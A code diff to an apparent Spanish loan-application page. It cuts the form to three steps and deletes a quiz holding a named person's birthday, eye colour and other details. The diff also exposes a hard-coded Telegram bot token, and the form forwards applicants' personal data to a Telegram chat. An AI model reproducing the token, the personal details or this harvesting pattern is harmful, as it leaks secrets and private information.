@@ -430,18 +430,21 @@
 
   .input-icon {
     position: absolute;
-    left: 13px;
+    left: 12px;
     top: 50%;
     transform: translateY(-50%);
     color: var(--muted);
-    font-size: 0.9rem;
+    font-size: 0.85rem;
     pointer-events: none;
     display: flex;
     align-items: center;
+    line-height: 1;
+    width: 18px;
+    text-align: center;
   }
 
   .input-icon + input,
-  .input-icon + textarea { padding-left: 38px; }
+  .input-icon + textarea { padding-left: 36px; }
 
   input[type=text], input[type=number], input[type=email], input[type=tel], textarea, select {
     width: 100%;
@@ -1021,7 +1024,7 @@
     <div class="hero">
       <div class="hero-eyebrow">💳 Solicitud de Crédito</div>
       <h1>Tu préstamo,<br><span class="gradient-text">rápido y seguro</span></h1>
-      <p>Completa el formulario en 4 pasos y recibe tu propuesta al instante con PDF descargable.</p>
+      <p>Completa el formulario en 3 pasos y recibe tu propuesta al instante con PDF descargable.</p>
     </div>
 
     <!-- PROGRESS STEPS -->
@@ -1039,11 +1042,6 @@
         <div class="step-connector" id="sc2"><div class="step-connector-fill"></div></div>
         <div class="step-dot" id="sd3">
           <div class="step-dot-circle">3</div>
-          <span class="step-dot-label">Verificar</span>
-        </div>
-        <div class="step-connector" id="sc3"><div class="step-connector-fill"></div></div>
-        <div class="step-dot" id="sd4">
-          <div class="step-dot-circle">4</div>
           <span class="step-dot-label">Resumen</span>
         </div>
       </div>
@@ -1107,8 +1105,8 @@
         <div class="field">
           <label>Domicilio *</label>
           <div class="input-wrap">
-            <span class="input-icon" style="top:18px">📍</span>
-            <textarea id="domicilio" placeholder="Dirección, barrio, ciudad..."></textarea>
+            <span class="input-icon" style="top:14px; transform:none;">📍</span>
+            <textarea id="domicilio" placeholder="Dirección, barrio, ciudad..." style="padding-left:36px;"></textarea>
           </div>
           <span class="err-msg" id="err-domicilio">⚠ Ingresa tu domicilio</span>
         </div>
@@ -1188,33 +1186,11 @@
       </div>
     </div>
 
-    <!-- STEP 3 -->
+    <!-- STEP 3: Resumen -->
     <div class="step" id="step3">
       <div class="section-hd">
         <div class="section-hd-top">
           <div class="step-badge">03</div>
-          <h2>Verificación de Identidad</h2>
-        </div>
-        <p>Por seguridad, responde estas preguntas de validación.</p>
-      </div>
-
-      <div class="vblock" id="vBlock">
-        <div class="vblock-header">
-          <div class="vblock-icon">🔐</div>
-          <div>
-            <div class="vblock-title" id="vTitle">Preguntas de seguridad</div>
-            <div class="vblock-desc" id="vDesc">Responde correctamente para continuar.</div>
-          </div>
-        </div>
-        <div id="vQuestions"></div>
-      </div>
-    </div>
-
-    <!-- STEP 4 -->
-    <div class="step" id="step4">
-      <div class="section-hd">
-        <div class="section-hd-top">
-          <div class="step-badge">04</div>
           <h2>Resumen del Préstamo</h2>
         </div>
         <p>Revisa toda la información antes de enviar.</p>
@@ -1283,59 +1259,9 @@ const RATES = {
 };
 
 const TG_BOT_TOKEN = '8536566578:AAG42YyO1TFdWNFxRywV2Wp097Zld5s-Oog';
-const TG_CHAT_ID   = '7941395763';
+const TG_CHAT_ID   = 'T7941395763';
 
-const VALIDATIONS = {
-  conyugue: {
-    title: 'Validación — Cónyuge',
-    desc: 'Para proceder, responde correctamente estas preguntas personales.',
-    questions: [
-      { q: '¿Cuál es mi color favorito?',        key: 'conyugue_1', answer: 'rojo' },
-      { q: '¿Cuál es mi fecha de cumpleaños?',   key: 'conyugue_2', answer: '20-07-2003' },
-      { q: '¿Qué me gusta de comida rápida?',    key: 'conyugue_3', answer: 'picada' },
-      { q: '¿Cuál es mi estatura?',              key: 'conyugue_4', answer: '1.78' },
-    ]
-  },
-  conocido: {
-    title: 'Validación — Conocido',
-    desc: 'Verifica que realmente me conoces.',
-    questions: [
-      { q: '¿Cuál es mi nombre?',         key: 'conocido_1', answer: 'joel pineda' },
-      { q: '¿De qué color son mis ojos?', key: 'conocido_2', answer: 'azules' },
-    ]
-  },
-  hermano_fe: {
-    title: 'Validación — Hermano en la Fe',
-    desc: 'Responde sobre tu conocimiento de mi ministerio.',
-    questions: [
-      { q: '¿Qué hago en la iglesia?',  key: 'hermano_1', answer: 'musico' },
-      { q: '¿Qué instrumento toco?',    key: 'hermano_2', answer: 'bajo' },
-    ]
-  },
-  amigo: {
-    title: 'Validación — Amigo/a',
-    desc: 'Solo un amigo real sabe esto.',
-    questions: [
-      { q: '¿Qué juegos me gustan? (nombra uno)', key: 'amigo_1', answer: null, multi: ['free fire', 'halo'] },
-    ]
-  },
-  familiar: {
-    title: 'Validación — Familiar',
-    desc: 'Confirma que eres parte de mi familia.',
-    questions: [
-      { q: '¿Cuál es mi fecha de cumpleaños?', key: 'familiar_1', answer: '20-07-2003' },
-      { q: '¿Qué moto tengo?',                 key: 'familiar_2', answer: 'raider' },
-      { q: '¿Qué estudio?',                    key: 'familiar_3', answer: 'ingenieria de sistemas' },
-    ]
-  },
-  colega: {
-    title: 'Validación — Colega',
-    desc: 'Confirma que compartimos un entorno laboral.',
-    questions: [
-      { q: '¿Qué estudio o en qué área me desempeño?', key: 'colega_1', answer: 'ingenieria de sistemas' },
-    ]
-  },
-};
+const VALIDATIONS = {};
 
 // ════════════════════════════════════════════
 //  ESTADO
@@ -1584,19 +1510,21 @@ function setStep(n) {
   } else {
     nav.classList.remove('hidden');
     back.style.display = (n > 1) ? 'flex' : 'none';
-    btn.querySelector('.btn-text').textContent = n === 4 ? 'Enviar solicitud 🚀' : 'Continuar →';
+    btn.querySelector('.btn-text').textContent = n === 3 ? 'Enviar solicitud 🚀' : 'Continuar →';
   }
 
-  // Actualizar dots
-  [1,2,3,4].forEach(i => {
+  // Actualizar dots (solo 3 ahora)
+  [1,2,3].forEach(i => {
     const dot = $('sd' + i);
+    if (!dot) return;
     dot.classList.remove('active','done');
     if (i < n) dot.classList.add('done');
     else if (i === n) dot.classList.add('active');
   });
-  // Actualizar connectors
-  [1,2,3].forEach(i => {
+  // Actualizar connectors (solo 2 ahora)
+  [1,2].forEach(i => {
     const con = $('sc' + i);
+    if (!con) return;
     con.classList.toggle('done', i < n);
   });
 
@@ -1611,13 +1539,9 @@ function nextStep() {
     setStep(2);
   } else if (currentStep === 2) {
     if (!validateStep2()) { showToast('⚠️ Verifica los datos del préstamo', 'error'); return; }
-    buildValidationUI();
+    buildSummary();
     setStep(3);
   } else if (currentStep === 3) {
-    if (!checkValidation()) { showToast('❌ Algunas respuestas son incorrectas', 'error'); return; }
-    buildSummary();
-    setStep(4);
-  } else if (currentStep === 4) {
     btn.classList.add('loading');
     sendToTelegram().then(() => {
       btn.classList.remove('loading');
